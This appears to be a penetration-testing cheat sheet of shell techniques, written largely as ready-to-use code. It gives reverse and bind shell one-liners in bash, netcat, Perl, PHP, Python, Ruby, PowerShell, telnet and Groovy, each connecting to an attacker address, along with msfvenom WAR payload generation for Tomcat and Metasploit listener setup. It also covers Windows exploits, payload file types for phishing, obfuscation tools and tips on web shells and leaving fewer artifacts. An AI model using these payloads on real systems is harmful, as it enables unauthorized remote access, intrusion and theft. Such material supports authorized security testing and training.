# Shells

### Best Resource:

{% embed url="https://revshells.com" %}

### Reverse Shells

**Listeners**

```
nc -nlvp 9001
# or a more stable listener
rlwrap --always-readline nc -nvlp 443
```

* Always set up a **netcat** listener before executing a bash reverse shell
* You can also use **multi/handler** from **metasploit** to catch incoming reverse shells

```
msfconsole
use exploit /multi/handler
set LHOST 172.16.6.1
set LPORT 9001
run
```

**Netcat Reverse Shell**

```
nc 172.16.6.1 9001 -e /bin/sh
```

* Standard **netcat** reverse shell (only works with some versions of nc)

### **Bash Reverse Shells**

* Good first attempt at a shell.

```
bash -i >& /dev/tcp/172.16.6.1/1234 0>&1
```

* Best **bash** reverse shell option, has the highest percentage success rate.&#x20;

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 172.16.6.1 1234 >/tmp/f
```

### **Perl Reverse Shell**

```
perl -e 'use Socket;$i="172.16.6.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### **PHP Reverse Shell**

```
php -r '$sock=fsockopen("172.16.6.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

* Standard PHP reverse shell typically used for injection on the terminal environment or into a web application

```
$sock=fsockopen("172.16.6.1", 1234);exec("/bin/sh -i <&3 >&3 2>&3");
```

* This php shell is used when you can inject php code into a theme file of a CMS (think wordpress)
* Also have the option of attempting p0wny.php shell for wordpress

{% embed url="https://github.com/flozz/p0wny-shell/blob/master/shell.php" %}
p0wny.php download&#x20;
{% endembed %}

* Most effective is the php-reverse-shell.php when it comes to wordpress and php reverse shells in general&#x20;

{% embed url="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php" %}
php\__reverse\__&#x73;hell.php
{% endembed %}

### **Python Reverse Shell**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.6.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

* Troubleshooting lessons

```
which python
which python3
/usr/bin/python
/usr/bin/python3
```

* Try the absolute paths when `python3` or `python` are not working to trigger your reverse shell
* Standard python reverse shell

**Python**

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.83",8443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Python 3**

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.50.74",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

**Python - Inline**

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.50.74",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

**Python - Script**

```python
#!/usr/bin/python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.76", 443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"]);
```

### **Ruby Reverse Shell**

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("172.16.6.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

* Linux ruby reverse shell

```
ruby -rsocket -e 'c=TCPSocket.new("172.16.6.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

* Windows ruby reverse shell

### **War Reverse Shell**

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.6.1 LPORT=1234 -f war > /home/kali/Documents/shell.war
```

* This will generate a war file for upload on the **Tomcat** CMS. Once uploaded click on the shell option to activate it.
* Catch this shell with **multi/handler** or just **nc**

```
msfconsole
use exploit /multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST 172.16.6.1
set LPORT 1234
run
```

#### AT

```bash
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

#### SED

```bash
sed -n '1e exec sh 1>&0' /etc/hosts
```

### **Reverse shell over the Telnet Protocol**

```
mknod a p; telnet 172.16.6.1 1234 0<a | /bin/sh 1>a
```

* This reverse shell makes a special character file (mknod) uses telnet to call back and direct standard output to the character file via the binary /bin/sh

### Powershell

```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Bind Shells

### **Netcat Bind Shell**

```
nc -nlvp 1234 -e /bin/sh
```

* This is executed on the target box and waits for an incoming connection (only works with some versions of nc that support `-e`)

```
nc [target box ip] 1234
```

* This is executed on your attack box to connect to the listener on the target

### **Named Pipe Bind Shell**

When `-e` is not available, use a FIFO named pipe:

**Server (target):**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

**Client (attack box):**

```bash
nc -nv 10.129.41.200 7777
```

---

## One-Liner Breakdowns

### Netcat/Bash Reverse Shell One-Liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

| Component | Purpose |
|---|---|
| `rm -f /tmp/f;` | Remove `/tmp/f` if it exists. `-f` ignores nonexistent files. |
| `mkfifo /tmp/f;` | Create a FIFO named pipe file at `/tmp/f`. |
| `cat /tmp/f \|` | Read the named pipe and pipe its output to the next command. |
| `/bin/bash -i 2>&1 \|` | Start an interactive bash shell (`-i`), redirect stderr to stdout (`2>&1`), pipe output onward. |
| `nc 10.10.14.12 7777 > /tmp/f` | Connect to the attacker on port 7777 and redirect received data back into the named pipe, completing the loop. |

---

## Infiltrating Windows

### Prominent Windows Exploits

| Vulnerability | Description |
|---|---|
| `MS08-067` | Critical SMB flaw exploited by the Conficker worm and Stuxnet. Affects many Windows revisions. |
| `EternalBlue` (MS17-010) | NSA exploit leaked by Shadow Brokers. Used in WannaCry and NotPetya. SMBv1 code execution. Infected 200,000+ hosts in 2017. |
| `PrintNightmare` | RCE in Windows Print Spooler. With valid creds or a low-priv shell, install a printer driver that grants SYSTEM access. |
| `BlueKeep` (CVE-2019-0708) | RCE in Microsoft's RDP protocol via a miscalled channel. Affects Windows 2000 through Server 2008 R2. |
| `Sigred` (CVE-2020-1350) | Flaw in DNS SIG resource record parsing. Exploiting the domain's DNS server (often the primary DC) yields Domain Admin. |
| `SeriousSam` (CVE-2021-36934) | Permissions issue on `C:\Windows\system32\config`. Non-elevated users can read SAM database from volume shadow copy backups, dumping credentials. |
| `Zerologon` (CVE-2020-1472) | Cryptographic flaw in MS-NRPC. ~256 guesses at a computer account password grants domain-level access in seconds. |

### Windows Fingerprinting

**TTL-based identification:**

```bash
ping 192.168.86.39
# TTL=128 → Windows host (Linux defaults to 64)
```

**Nmap OS detection:**

```bash
sudo nmap -v -O 192.168.86.39
```

Look for `OS CPE: cpe:/o:microsoft:windows_10` and `OS details:` in the output. If detection fails, try `-A -Pn`. Firewalls can obscure results — use multiple checks to confirm.

**Banner grab:**

```bash
sudo nmap -v 192.168.86.39 --script banner.nse
```

### Windows Payload File Types

| Type | Extension | Use Case |
|---|---|---|
| DLL | `.dll` | Inject malicious DLL or hijack vulnerable library for priv esc / UAC bypass |
| Batch | `.bat` | Automate commands via the command-line interpreter (open ports, connect back, enumerate) |
| VBS | `.vbs` | Client-side scripting for phishing (macro-enabled docs, clicking cells to trigger Windows scripting engine) |
| MSI | `.msi` | Craft payload as Windows installer package, execute with `msiexec` for elevated reverse shell |
| PowerShell | `.ps1` | Dynamic .NET-based scripting — most versatile for shell access and post-exploitation |

### Payload Generation Resources

| Resource | Description |
|---|---|
| [MSFVenom & Metasploit-Framework](https://github.com/rapid7/metasploit-framework) | Swiss-army knife for enumeration, payload generation, exploitation, and post-exploitation |
| [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings) | Cheat sheets for payload generation and general methodology |
| [Mythic C2 Framework](https://github.com/its-a-feature/Mythic) | Alternative C2 framework with unique payload generation |
| [Nishang](https://github.com/samratashok/nishang) | Offensive PowerShell framework — implants, shells, and utilities |
| [Darkarmour](https://github.com/bats3c/darkarmour) | Obfuscated binary generation for Windows targets |

### Payload Transfer Methods

* **Impacket** — `psexec`, `smbclient`, `wmi`, Kerberos, and SMB server
* **SMB** — Leverage domain shares, `C$`, `ADMIN$` for payload hosting, transfer, and data exfiltration
* **Remote MSF Execution** — Many exploit modules build, stage, and execute payloads automatically
* **Other Protocols** — FTP, TFTP, HTTP/S for file upload to the host

---

## Web Shell Considerations

* Web apps may auto-delete uploaded files after a set period
* Limited interactivity — no proper file system navigation, chaining commands may fail
* Greater chance of leaving artifacts for defenders
* Best practice: establish a reverse shell from the web shell, then delete the uploaded payload
* Document all payload names, file hashes (SHA1/MD5), and upload locations for your report

---

### Groovy

```groovy
Thread.start {
	String host="10.10.15.89";
	int port=4444;
	String cmd="/bin/bash";
	Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```

